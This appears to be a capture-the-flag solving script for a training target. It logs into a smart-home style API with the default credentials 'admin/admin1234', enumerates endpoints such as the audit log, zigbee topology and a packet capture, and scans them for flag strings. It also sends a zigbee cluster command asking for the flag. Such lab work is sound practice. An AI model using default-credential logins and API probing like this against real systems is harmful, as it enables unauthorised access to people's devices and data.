#!/usr/bin/env python3
import requests
import json
import re

def get_token():
    resp = requests.post("http://training-pod2.ctfchile.com:32780/api/v2/auth/login",
                        json={"username":"admin","password":"admin1234"})
    return resp.json()["access_token"]

def check_all_endpoints():
    token = get_token()
    headers = {"Authorization": f"Bearer {token}"}

    print("[*] === COMPREHENSIVE ENDPOINT ANALYSIS ===")

    # Check all the APIs we've discovered
    endpoints_to_check = [
        "/api/v2/states",
        "/api/v2/zigbee/network",
        "/api/v2/zigbee/topology",
        "/api/v2/system/info",
        "/api/v2/system/audit-log",
        "/api/v2/logbook",
        "/api/v2/config/integrations",
        "/diagnostics/capture.pcap"
    ]

    for endpoint in endpoints_to_check:
        try:
            resp = requests.get(f"http://training-pod2.ctfchile.com:32780{endpoint}", headers=headers)
            data = resp.text if endpoint.endswith('.pcap') else resp.json()

            # Search for flag patterns in response
            response_str = str(data).lower()
            flag_patterns = ['flag', 'ctf{', 'ctfchile{', 'shadow_coordinator', 'coordinator_flag', 'internal_flag']

            for pattern in flag_patterns:
                if pattern in response_str:
                    print(f"[!] POTENTIAL FLAG in {endpoint}: Pattern '{pattern}' found")
                    if isinstance(data, dict):
                        print(f"    Response: {json.dumps(data, indent=2)[:500]}...")
                    else:
                        lines = str(data).split('\n')
                        for i, line in enumerate(lines):
                            if pattern in line.lower():
                                print(f"    Line {i}: {line}")

        except Exception as e:
            print(f"[-] Error checking {endpoint}: {e}")

    print("\n[*] === CHECKING FOR HIDDEN FLAG ENTITIES ===")

    # Get all entities and look for flag-related ones
    try:
        resp = requests.get("http://training-pod2.ctfchile.com:32780/api/v2/states", headers=headers)
        entities = resp.json().get('entities', [])

        for entity in entities:
            entity_str = json.dumps(entity).lower()
            if any(word in entity_str for word in ['flag', 'ctf', 'shadow', 'coordinator_flag']):
                print(f"[!] FLAG-LIKE ENTITY: {json.dumps(entity, indent=2)}")

            # Check for base64 encoded data
            for key, value in entity.items():
                if isinstance(value, str) and len(value) > 10:
                    try:
                        import base64
                        decoded = base64.b64decode(value).decode()
                        if any(word in decoded.lower() for word in ['flag', 'ctf']):
                            print(f"[!] BASE64 FLAG in {entity['entity_id']}.{key}: {decoded}")
                    except:
                        pass

    except Exception as e:
        print(f"[-] Error checking entities: {e}")

    print("\n[*] === CHECKING RECENT COMMANDS AND RESPONSES ===")

    # Check if our commands produced any results that we missed
    try:
        # Send a final command and monitor closely
        final_cmd = {
            "ieee": "00:12:4B:00:24:AA:10:01",
            "cluster_id": 257,
            "command": "get_flag"
        }

        print(f"[*] Sending final command: {json.dumps(final_cmd)}")
        resp = requests.post(
            "http://training-pod2.ctfchile.com:32780/api/v2/services/zha/issue_zigbee_cluster_command",
            headers=headers, json=final_cmd
        )
        print(f"[*] Command response: {resp.json()}")

        # Check audit log immediately after
        import time
        time.sleep(2)

        resp = requests.get("http://training-pod2.ctfchile.com:32780/api/v2/system/audit-log", headers=headers)
        audit_entries = resp.json().get('entries', [])[:5]

        for entry in audit_entries:
            entry_str = json.dumps(entry).lower()
            if any(word in entry_str for word in ['flag', 'ctf', 'response', 'result']):
                print(f"[!] RECENT AUDIT ENTRY: {json.dumps(entry, indent=2)}")

    except Exception as e:
        print(f"[-] Error with final command: {e}")

    print("\n[*] Analysis complete.")

if __name__ == "__main__":
    check_all_endpoints()